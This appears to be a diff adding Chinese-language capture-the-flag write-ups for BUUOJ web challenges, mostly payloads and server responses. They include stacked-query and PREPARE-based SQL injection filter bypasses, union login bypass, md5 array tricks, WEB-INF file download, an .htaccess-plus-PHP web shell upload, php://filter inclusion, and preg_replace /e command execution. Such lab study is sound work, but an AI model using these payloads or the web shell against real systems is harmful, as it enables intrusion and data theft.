@@ -2111,4 +2111,234 @@ Content-Type: image/jpeg
 1 or extractvalue(1, (select database()) )
 
 return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
+
+1';show databases;#
+
+array(1) {
+  [0]=>
+  string(11) "ctftraining"
+}
+
+1';show tables;#
+
+array(1) {
+  [0]=>
+  string(8) "FlagHere"
+}
+
+1'; show columns from `FlagHere` ; #
+
+array(6) {
+  [0]=>
+  string(4) "flag"
+  [1]=>
+  string(12) "varchar(100)"
+  [2]=>
+  string(2) "NO"
+  [3]=>
+  string(0) ""
+  [4]=>
+  NULL
+  [5]=>
+  string(0) ""
+}
+
+1';PREPARE hacker from concat('s','elect', ' * from `FlagHere` ');EXECUTE hacker;#
+
+return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
+
+1';EXECUTE IMMEDIATE concat('s','elect',' * from `FlagHere` ');#
 ```
+### [Easy Java](https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java)
+改用Post访问help页面
+```sh
+http://9d24f2aa-ecea-4684-bdaf-a302942722b8.node5.buuoj.cn:81/Download?filename=help.docx
+
+java.io.FileNotFoundException:{help.docx}
+
+POST /Download?filename=help.docx HTTP/1.1
+```
+响应中的文件内容保存成.docx
+```
+Are you sure the flag is here? ? ?
+```
+emmm...... 
+
+WEB-INF 是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。web.xml用于映射路径（URI）和后端服务程序（servlet）。servlet 是经过编译后，后缀名为.class的文件
+```sh
+POST /Download?filename=/WEB-INF/web.xml HTTP/1.1
+```
+```xml
+      <servlet>
+        <servlet-name>FlagController</servlet-name>
+        <servlet-class>com.wm.ctf.FlagController</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>FlagController</servlet-name>
+        <url-pattern>/Flag</url-pattern>
+    </servlet-mapping>
+```
+```sh
+POST /Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class HTTP/1.1
+```
+得到.class文件后进行java反编译，但失败。。。内容中有一串明显base64: ZmxhZ3tiNmVmZTdiMC01NmJlLTQ5NWEtOTA3My05NGM2NWZlZDVjMjN9Cg== 解码得到flag
+### [BabySQli](https://buuoj.cn/challenges#[GXYCTF2019]BabySQli)
+```sh
+name=admin'#&pw=1
+
+wrong pass!
+
+name=admin';show%20tables;#&pw=1
+
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'show tables;#'' at line 1
+
+name=admin';or%20show%20tables;#&pw=1
+
+do not hack me!
+```
+可知过滤了`or/database()`
+```sh
+name=admin'%20union%20select%201,2,3#&pw=1
+
+wrong pass!
+```
+F12及返回中都有注释，先base32再base64得到
+```php
+<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
+
+b"select * from user where username = '$name'"
+
+pw='abc'
+md5(pw.encode()).hexdigest()
+'900150983cd24fb0d6963f7d28e17f72'
+
+name=1'union%20select%201,'admin','900150983cd24fb0d6963f7d28e17f72'#&pw=abc
+```
+是怎么猜出pw用了md5的？？？
+### [Easy MD5](https://buuoj.cn/challenges#[BJDCTF2020]Easy%20MD5)
+```sh
+hint: select * from 'admin' where password=md5($pass,true)
+```
+`ffifdyop`的md5开头是`'or'6`字样，使得查询返回值为true
+```html
+<script>window.location.replace('./levels91.php')</script>
+
+<!--
+$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b && md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+-->
+
+GET /levels91.php?a[]=1&b[]=2 HTTP/1.1
+
+<script>window.location.replace('./levell14.php')</script>
+```
+```php
+<?php
+error_reporting(0);
+include "flag.php";
+
+highlight_file(__FILE__);
+
+if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
+    echo $flag;
+}
+```
+get转post数组绕过md5
+```
+POST /levell14.php HTTP/1.1
+
+Content-Type: application/x-www-form-urlencoded
+
+param1[]=1&param2[]=1t 
+```
+### [Submit](https://buuoj.cn/challenges#[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2)
+类型只接收Content-Type: image/jpeg，考虑先上传.htaccess
+```sh
+<FilesMatch "shell">
+SetHandler application/x-httpd-php
+</FilesMatch>
+```
+再上传shell.jpg
+```php
+<?php system($_GET["cmd"]); ?>
+```
+用AntSward连接。。。不知道什么原因一直连不上。。。
+### [Had a bad day](https://buuoj.cn/challenges#[BSidesCF%202020]Had%20a%20bad%20day)
+文件包含漏洞
+```
+GET /index.php?category=php://filter/read=convert.base64-encode/resource=index HTTP/1.1
+```
+```php
+ <?php
+				$file = $_GET['category'];
+
+				if(isset($file))
+				{
+					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
+						include ($file . '.php');
+					}
+					else{
+						echo "Sorry, we currently only support woofers and meowers.";
+					}
+				}
+				?>
+```
+```
+GET /index.php?category=woofers/../flag HTTP/1.1
+```
+### [不过如此](https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4)
+```php
+<?php
+
+error_reporting(0);
+$text = $_GET["text"];
+$file = $_GET["file"];
+if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        die("Not now!");
+    }
+
+    include($file);  //next.php
+    
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+```
+GET /?text=data://text/plain,I%20have%20a%20dream&file=php://filter/convert.base64-encode/resource=next.php HTTP/1.1
+```
+```php
+<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+	@eval($_GET['cmd']);
+}
+
+```
+```
+GET /next.php?\S*=${getFlag()}&cmd=system('ls%20/'); HTTP/1.1
+
+GET /next.php?\S*=${getFlag()}&cmd=system('cat%20/flag'); HTTP/1.1
+```
+### []()
